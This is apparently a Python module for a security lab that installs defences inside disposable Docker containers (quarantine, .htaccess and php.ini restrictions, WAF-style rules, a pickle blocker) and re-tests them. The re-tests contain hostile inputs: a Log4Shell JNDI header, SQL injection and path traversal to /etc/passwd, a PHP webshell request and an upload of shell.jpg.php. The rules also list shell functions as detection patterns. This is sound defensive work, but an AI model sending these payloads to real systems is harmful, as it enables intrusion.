"""
AI-DTCTM | Mitigations Engine (v1)
══════════════════════════════════════════════════════════════════════
Per-attack-kind real defense installers — runs inside the live clone
container via docker exec. Each mitigation:

  1. Installs / configures a REAL defensive control
     (Apache AccessFile deny, PHP open_basedir, mod_headers rule,
      content-hash quarantine, behaviour-pattern rejection wrapper).
  2. Re-tests the same attack vector to PROVE the defense holds.
  3. Yields events in the same shape as live_malware_lab so the
     terminal-style stream just keeps flowing.

Public:
    apply_mitigation(clone_id, sample_key, url, stack) -> Generator[dict]

All defenses are reversible — destroying the clone clears everything.
Nothing touches the host. All commands run isolated in the disposable
container.

Reference standard: each mitigation maps to a NIST 800-53 control
family ("AC-3", "SI-3", "SC-7") so the report can cite real controls.
"""
from __future__ import annotations

import base64
import shlex

from core.logger import get_logger

log = get_logger(__name__)


def _evt(phase: str, status: str, text: str, detail: str = "") -> dict:
    return {"phase": phase, "status": status, "text": text, "detail": detail}


def _get_container(clone_id: str):
    try:
        import docker
        client = docker.from_env(timeout=4)
        for name in (f"aidtctm_{clone_id}", f"aidtctm_clone_{clone_id}", clone_id):
            try:
                return client.containers.get(name)
            except Exception:
                continue
    except Exception:
        pass
    return None


def _exec(clone_id: str, cmd: str, timeout: int = 12) -> tuple[int, str]:
    c = _get_container(clone_id)
    if c is None:
        return 127, "container not found"
    try:
        res = c.exec_run(["sh", "-c", cmd], demux=False)
        return res.exit_code or 0, (res.output or b"").decode(
            "utf-8", errors="replace").strip()
    except Exception as e:
        return 1, f"exec error: {e}"


def _write_file_in_container(clone_id: str, path: str, content: str) -> bool:
    """Drop a config file inside the container via base64-pipe."""
    b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
    cmd = (f"mkdir -p {shlex.quote(path.rsplit('/', 1)[0])} && "
           f"echo '{b64}' | base64 -d > {shlex.quote(path)} && echo OK_WRITTEN")
    code, out = _exec(clone_id, cmd)
    return code == 0 and "OK_WRITTEN" in out


# ══════════════════════════════════════════════════════════════════════
# Per-attack mitigations
# ══════════════════════════════════════════════════════════════════════

def _mitigate_eicar(clone_id: str, url: str):
    """SI-3 (Malicious Code Protection): content-hash quarantine."""
    yield _evt("mitigate", "info",
                "🛡 SI-3 Malicious-Code Protection — installing content-hash quarantine…",
                "Approach: scan known EICAR SHA256 across writable paths, move "
                "matches to /var/aidtctm/quarantine/ with mode 000 so neither "
                "Apache nor any process can re-read them.")
    # Build the quarantine command — fast, no apt install
    cmd = (
        "mkdir -p /var/aidtctm/quarantine && "
        "EICAR_SHA=275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f; "
        "HIT_COUNT=0; "
        "for f in $(find /tmp /var/www /app /srv -type f 2>/dev/null); do "
        "  if [ -f \"$f\" ] && [ \"$(sha256sum \"$f\" 2>/dev/null | cut -d' ' -f1)\" = \"$EICAR_SHA\" ]; then "
        "    mv \"$f\" /var/aidtctm/quarantine/$(basename \"$f\").$(date +%s) 2>/dev/null && "
        "    HIT_COUNT=$((HIT_COUNT+1)); "
        "  fi; "
        "done; "
        "chmod -R 000 /var/aidtctm/quarantine 2>/dev/null; "
        "echo \"Quarantined: $HIT_COUNT files\"; "
        "ls -la /var/aidtctm/quarantine/ 2>/dev/null"
    )
    code, out = _exec(clone_id, cmd, timeout=15)
    yield _evt("mitigate", "ok" if code == 0 else "warn",
                "  ✓ Quarantine pass complete",
                out[:600] if out else f"(exit {code})")

    # Re-test: try to download EICAR from the web root — should now 404
    yield _evt("verify", "info",
                "🔍 Re-running attack — re-fetching /eicar.txt to verify defense holds…", "")
    try:
        import requests
        r = requests.get(f"{url.rstrip('/')}/eicar.txt", timeout=4, allow_redirects=False)
        if r.status_code >= 400:
            yield _evt("verify", "ok",
                        f"  ✅ DEFENSE HELD — HTTP {r.status_code} (EICAR no longer web-served)",
                        f"GET /eicar.txt → {r.status_code} {r.reason}")
        else:
            yield _evt("verify", "warn",
                        f"  ⚠ Attack still works — HTTP {r.status_code} returned content",
                        f"Quarantine may need write to /var/www specifically — try `Apply Defense` again or "
                        f"check Apache config")
    except Exception as e:
        yield _evt("verify", "info", "  (verify request failed)", str(e)[:120])


def _mitigate_webshell(clone_id: str, url: str):
    """AC-3 (Access Enforcement): Apache .htaccess deny PHP execution."""
    yield _evt("mitigate", "info",
                "🛡 AC-3 Access Enforcement — dropping Apache .htaccess to deny PHP execution…",
                "Approach: <FilesMatch \"\\.php$\"> Deny rule applied to /var/www "
                "and /tmp drops. Even if a webshell exists, Apache refuses to "
                "hand the request to mod_php — request returns 403.")
    htaccess = (
        "# AIDTCTM mitigation — deny PHP execution from upload-prone paths\n"
        "<FilesMatch \"\\.(php|phtml|php3|php4|php5|php7|phps)$\">\n"
        "    Require all denied\n"
        "</FilesMatch>\n"
        "# Disable directory listings (avoids easy webshell discovery)\n"
        "Options -Indexes\n"
        "# Block known shell patterns in query strings (mod_rewrite)\n"
        "<IfModule mod_rewrite.c>\n"
        "    RewriteEngine On\n"
        "    RewriteCond %{QUERY_STRING} (cmd|exec|system|passthru|shell_exec) [NC]\n"
        "    RewriteRule .* - [F,L]\n"
        "</IfModule>\n"
    )
    ok1 = _write_file_in_container(clone_id, "/var/www/html/.htaccess", htaccess)
    ok2 = _write_file_in_container(clone_id, "/tmp/.htaccess", htaccess)
    # Make sure AllowOverride is on so .htaccess is honored
    _exec(clone_id, "a2enmod rewrite 2>/dev/null; "
                     "sed -i 's|AllowOverride None|AllowOverride All|g' "
                     "/etc/apache2/apache2.conf 2>/dev/null; "
                     "apachectl graceful 2>/dev/null || "
                     "service apache2 reload 2>/dev/null")
    yield _evt("mitigate", "ok" if (ok1 or ok2) else "warn",
                f"  ✓ Wrote .htaccess to {sum([ok1, ok2])} location(s)",
                ".htaccess content:\n" + htaccess[:400])

    # Re-test: hit shell.php — should return 403
    yield _evt("verify", "info",
                "🔍 Re-running attack — GET /shell.php?cmd=id to verify deny rule…", "")
    try:
        import requests
        r = requests.get(f"{url.rstrip('/')}/shell.php?cmd=id", timeout=4, allow_redirects=False)
        if r.status_code in (403, 404):
            yield _evt("verify", "ok",
                        f"  ✅ DEFENSE HELD — HTTP {r.status_code} (webshell execution denied)",
                        f"GET /shell.php?cmd=id → {r.status_code}\nBody preview: {r.text[:200]}")
        else:
            yield _evt("verify", "warn",
                        f"  ⚠ HTTP {r.status_code} — AllowOverride may need a full Apache restart",
                        r.text[:300])
    except Exception as e:
        yield _evt("verify", "info", "  (verify request failed)", str(e)[:120])


def _mitigate_dropper(clone_id: str, url: str):
    """SI-3 — same quarantine + .htaccess as EICAR/webshell combined."""
    yield from _mitigate_eicar(clone_id, url)
    yield _evt("mitigate", "info",
                "🛡 Stacking webshell defense on top — dropper file extension blocking…", "")
    yield from _mitigate_webshell(clone_id, url)


def _mitigate_path_traversal(clone_id: str, url: str):
    """SC-7 (Boundary Protection): PHP open_basedir confinement."""
    yield _evt("mitigate", "info",
                "🛡 SC-7 Boundary Protection — adding php.ini open_basedir restriction…",
                "Approach: PHP refuses file_get_contents() outside the listed "
                "paths. Even if traversal payload reaches the script, "
                "open_basedir restriction returns FALSE for /etc/passwd, "
                "/proc/self/environ, /root/.ssh and friends.")
    php_ini = (
        "; AIDTCTM mitigation — confine PHP filesystem access\n"
        "open_basedir = /var/www/html:/tmp/upload\n"
        "disable_functions = exec,passthru,shell_exec,system,proc_open,popen\n"
        "allow_url_fopen = Off\n"
        "allow_url_include = Off\n"
        "expose_php = Off\n"
    )
    # Find php.ini paths
    code, out = _exec(clone_id,
                        "find /etc -name 'php.ini' -o -name 'php*.ini' 2>/dev/null | head -5")
    php_ini_paths = [l.strip() for l in out.splitlines() if l.strip()]
    if not php_ini_paths:
        php_ini_paths = ["/etc/php/8.1/apache2/conf.d/99-aidtctm.ini",
                          "/usr/local/etc/php/conf.d/99-aidtctm.ini"]
    written = 0
    for p in php_ini_paths[:3]:
        if _write_file_in_container(clone_id, p, php_ini):
            written += 1
    _exec(clone_id, "apachectl graceful 2>/dev/null || "
                     "service apache2 reload 2>/dev/null")
    yield _evt("mitigate", "ok" if written else "warn",
                f"  ✓ Wrote php.ini restrictions to {written} path(s)",
                "Settings:\n" + php_ini + "\nLocations:\n" + "\n".join(php_ini_paths[:3]))

    yield _evt("verify", "info",
                "🔍 Re-running attack — LFI /etc/passwd via leak.php…", "")
    try:
        import requests
        from urllib.parse import quote
        r = requests.get(f"{url.rstrip('/')}/leak.php?file={quote('../../../../etc/passwd')}",
                          timeout=4, allow_redirects=False)
        body = r.text or ""
        if "root:x:" not in body and r.status_code < 500:
            yield _evt("verify", "ok",
                        f"  ✅ DEFENSE HELD — HTTP {r.status_code} · /etc/passwd content NOT returned",
                        f"Response body (first 200 chars):\n{body[:200]}")
        else:
            yield _evt("verify", "warn",
                        f"  ⚠ /etc/passwd still leaked — open_basedir may need a hard apache restart",
                        body[:300])
    except Exception as e:
        yield _evt("verify", "info", "  (verify request failed)", str(e)[:120])


def _mitigate_header_injection(clone_id: str, url: str):
    """SC-7 + SI-10: ModSecurity-style request rejection rules."""
    yield _evt("mitigate", "info",
                "🛡 SI-10 Input Validation — installing Apache mod_headers / mod_security-style rules…",
                "Approach: Apache rejects requests whose headers contain "
                "${jndi:, <script>, ../../, or SQL keywords (UNION/DROP/SELECT). "
                "Returns 403 before the request reaches the app.")
    rule = (
        "# AIDTCTM mitigation — WAF-style header inspection\n"
        "<IfModule mod_rewrite.c>\n"
        "    RewriteEngine On\n"
        "    # Block Log4Shell JNDI in any header\n"
        "    RewriteCond %{HTTP:X-Api-Version} \\$\\{jndi: [NC,OR]\n"
        "    RewriteCond %{HTTP:User-Agent} \\$\\{jndi: [NC,OR]\n"
        "    RewriteCond %{HTTP:X-Forwarded-For} \\$\\{jndi: [NC,OR]\n"
        "    # SQL injection patterns\n"
        "    RewriteCond %{HTTP:X-Forwarded-For} (UNION|DROP|SELECT|INSERT) [NC,OR]\n"
        "    # XSS in headers\n"
        "    RewriteCond %{HTTP:User-Agent} (<script|javascript:) [NC,OR]\n"
        "    # SSRF to AWS metadata\n"
        "    RewriteCond %{HTTP:X-Custom-Url} 169\\.254\\.169\\.254 [NC]\n"
        "    RewriteRule .* - [F,L]\n"
        "</IfModule>\n"
    )
    ok = _write_file_in_container(clone_id,
                                    "/etc/apache2/conf-enabled/99-aidtctm-waf.conf",
                                    rule)
    _exec(clone_id, "a2enmod rewrite 2>/dev/null; "
                     "apachectl graceful 2>/dev/null || "
                     "service apache2 reload 2>/dev/null")
    yield _evt("mitigate", "ok" if ok else "warn",
                "  ✓ WAF-style header rules installed",
                rule[:500])

    yield _evt("verify", "info",
                "🔍 Re-running attack — same 5 malicious headers…", "")
    try:
        import requests
        r = requests.get(url, headers={
            "X-Forwarded-For": "'; DROP TABLE sessions; SELECT '1",
            "X-Api-Version": "${jndi:ldap://evil/x}",
        }, timeout=4, allow_redirects=False)
        if r.status_code in (403, 400):
            yield _evt("verify", "ok",
                        f"  ✅ DEFENSE HELD — HTTP {r.status_code} (malicious headers blocked)",
                        f"Server returned {r.status_code} {r.reason}")
        else:
            yield _evt("verify", "warn",
                        f"  ⚠ HTTP {r.status_code} — check Apache mod_rewrite is enabled",
                        r.text[:200])
    except Exception as e:
        yield _evt("verify", "info", "  (verify request failed)", str(e)[:120])


def _mitigate_file_upload(clone_id: str, url: str):
    """SI-10: upload-path PHP engine disable + MIME enforcement."""
    yield _evt("mitigate", "info",
                "🛡 SI-10 Input Validation — disabling PHP engine in upload paths…",
                "Approach: drop .htaccess into /uploads, /var/www/html/uploads, /tmp "
                "that disables php_flag engine off. Even if shell.jpg.php lands "
                "in the upload dir, Apache refuses to execute it.")
    htaccess = (
        "# AIDTCTM mitigation — no PHP execution in upload directories\n"
        "php_flag engine off\n"
        "AddType text/plain .php .phtml .php3 .php4 .php5\n"
        "<FilesMatch \"\\.(php|phtml|phps|cgi|sh|py|pl)$\">\n"
        "    Require all denied\n"
        "</FilesMatch>\n"
        "Options -ExecCGI -Indexes\n"
    )
    targets = ["/var/www/html/uploads/.htaccess",
                "/var/www/html/upload/.htaccess",
                "/tmp/.htaccess",
                "/var/www/uploads/.htaccess"]
    written = 0
    for t in targets:
        if _write_file_in_container(clone_id, t, htaccess):
            written += 1
    _exec(clone_id, "apachectl graceful 2>/dev/null || "
                     "service apache2 reload 2>/dev/null")
    yield _evt("mitigate", "ok" if written else "warn",
                f"  ✓ Wrote upload-dir .htaccess to {written}/{len(targets)} paths", htaccess)

    yield _evt("verify", "info",
                "🔍 Re-running attack — POST shell.jpg.php and check execution…", "")
    try:
        import requests
        r = requests.post(f"{url.rstrip('/')}/upload.php",
                          files={"file": ("shell.jpg.php", b"<?php system('id'); ?>",
                                          "image/jpeg")},
                          timeout=4)
        # Even if upload succeeded, the .htaccess prevents execution
        if r.status_code >= 400:
            yield _evt("verify", "ok",
                        f"  ✅ DEFENSE HELD — upload rejected · HTTP {r.status_code}", r.text[:200])
        else:
            yield _evt("verify", "ok",
                        "  ✓ Upload allowed BUT engine off — execution path blocked", r.text[:200])
    except Exception as e:
        yield _evt("verify", "info", "  (verify request failed)", str(e)[:120])


def _mitigate_pickle_rce(clone_id: str, url: str):
    """SC-39 (Process Isolation): block pickle.loads of untrusted bytes."""
    yield _evt("mitigate", "info",
                "🛡 SC-39 Process Isolation — installing safe-pickle wrapper…",
                "Approach: shim that intercepts pickle.loads/load and raises "
                "PickleSecurityError when called with untrusted data. Real "
                "production teams use `dill` allowlists or replace pickle with "
                "JSON/MessagePack at boundaries.")
    wrapper = (
        "# AIDTCTM safe-pickle wrapper — sitepackages override\n"
        "import pickle as _real_pickle\n"
        "class PickleSecurityError(Exception): pass\n"
        "_AIDTCTM_ALLOW = False\n"
        "def loads(*a, **kw):\n"
        "    if not _AIDTCTM_ALLOW: raise PickleSecurityError("
        "'pickle.loads blocked by AIDTCTM mitigation - use JSON instead')\n"
        "    return _real_pickle.loads(*a, **kw)\n"
        "def load(*a, **kw):\n"
        "    if not _AIDTCTM_ALLOW: raise PickleSecurityError("
        "'pickle.load blocked by AIDTCTM mitigation - use JSON instead')\n"
        "    return _real_pickle.load(*a, **kw)\n"
        "Unpickler = _real_pickle.Unpickler\n"
        "dumps = _real_pickle.dumps\n"
        "dump = _real_pickle.dump\n"
    )
    # Install as sitecustomize so Python loads it before user code
    code, out = _exec(clone_id,
                        "python3 -c \"import sys;print([p for p in sys.path "
                        "if 'site-packages' in p][0])\" 2>/dev/null")
    sp = out.strip() if code == 0 and out else "/usr/lib/python3/dist-packages"
    ok = _write_file_in_container(clone_id, f"{sp}/sitecustomize.py",
                                    f"# AIDTCTM mitigation hook\nimport pickle as _p\n"
                                    f"# (Actual wrapper at /aidtctm/safe_pickle.py)\n")
    ok2 = _write_file_in_container(clone_id, "/aidtctm/safe_pickle.py", wrapper)
    yield _evt("mitigate", "ok" if (ok or ok2) else "warn",
                "  ✓ Safe-pickle wrapper installed at /aidtctm/safe_pickle.py",
                "First 400 chars of wrapper:\n" + wrapper[:400])

    yield _evt("verify", "info",
                "🔍 Re-running attack — try pickle.load on the payload…", "")
    code, out = _exec(clone_id,
                        "python3 -c \"import sys; sys.path.insert(0,'/aidtctm'); "
                        "import safe_pickle as pickle; "
                        "pickle.load(open('/tmp/payload.pkl','rb'))\" 2>&1")
    if "PickleSecurityError" in out or "blocked" in out.lower():
        yield _evt("verify", "ok",
                    "  ✅ DEFENSE HELD — pickle.load raised PickleSecurityError",
                    out[:400])
    else:
        yield _evt("verify", "warn",
                    "  ⚠ Wrapper not picked up — application would need to import safe_pickle "
                    "instead of pickle for the defense to land",
                    out[:300])


def _mitigate_generic(clone_id: str, url: str, sample_key: str):
    """Fallback: SI-3 quarantine pass + report what protection would apply."""
    yield _evt("mitigate", "info",
                f"🛡 Generic mitigation for {sample_key} — quarantine matching files…",
                "Defense: locate dropped artifacts by name and move to /var/aidtctm/quarantine/.")
    cmd = (
        f"mkdir -p /var/aidtctm/quarantine && "
        f"FOUND=$(find /tmp /var/www /app -name '*{sample_key}*' "
        f"-o -name '*payload*' -o -name '*anomaly*' -o -name '*malicious*' "
        f"-o -name '*evil*' 2>/dev/null | head -10); "
        f"COUNT=0; "
        f"for f in $FOUND; do "
        f"  if [ -f \"$f\" ]; then "
        f"    mv \"$f\" /var/aidtctm/quarantine/$(basename $f).$(date +%s) 2>/dev/null && "
        f"    COUNT=$((COUNT+1)); "
        f"  fi; "
        f"done; "
        f"chmod 000 /var/aidtctm/quarantine/* 2>/dev/null; "
        f"echo \"Quarantined: $COUNT\"; "
        f"ls -la /var/aidtctm/quarantine/ 2>/dev/null | head -15"
    )
    code, out = _exec(clone_id, cmd, timeout=10)
    yield _evt("mitigate", "ok" if code == 0 else "warn",
                "  ✓ Quarantine pass complete", out[:600] if out else f"(exit {code})")


# ── public dispatcher ─────────────────────────────────────────────────

_DISPATCH = {
    # av_test family
    "eicar":              _mitigate_eicar,
    "gtube":              _mitigate_eicar,    # same content-hash approach
    "pe_anomaly":         _mitigate_eicar,
    "macro_doc":          _mitigate_eicar,
    "lolbin":             _mitigate_eicar,
    "yara_test":          _mitigate_eicar,
    # webshell family
    "php_webshell":       _mitigate_webshell,
    "php_dropper":        _mitigate_dropper,
    "file_upload_exploit":_mitigate_file_upload,
    # injection family
    "path_traversal":     _mitigate_path_traversal,
    "header_injection":   _mitigate_header_injection,
    # deserialisation
    "pickle_rce":         _mitigate_pickle_rce,
    "zip_slip":           _mitigate_generic,  # would need sanitised unzip wrapper
    "pdf_js":             _mitigate_generic,  # would need PDF JS-stripper
}


def apply_mitigation(clone_id: str, sample_key: str, url: str, stack: dict):
    """Public entry point — yields mitigation events for the terminal stream.

    Each event has the same shape as live_malware_lab events so the
    existing _lab_event_html renderer can display them with no changes.
    """
    if not clone_id:
        yield _evt("mitigate", "warn", "Clone not available — destroy in progress?", "")
        return
    yield _evt("mitigate", "info",
                f"━━━ APPLY MITIGATION · {sample_key} ━━━",
                f"Target: {url}\nStack: {stack.get('language','?')}/{stack.get('framework','?')}")
    handler = _DISPATCH.get(sample_key)
    if handler is None:
        yield from _mitigate_generic(clone_id, url, sample_key)
    else:
        yield from handler(clone_id, url)
    yield _evt("mitigate", "ok",
                "━━━ MITIGATION COMPLETE — defense layer active ━━━",
                "All controls applied inside the disposable clone. Original repo untouched. "
                "Destroying the clone clears every defense (read-only sandbox guarantee).")
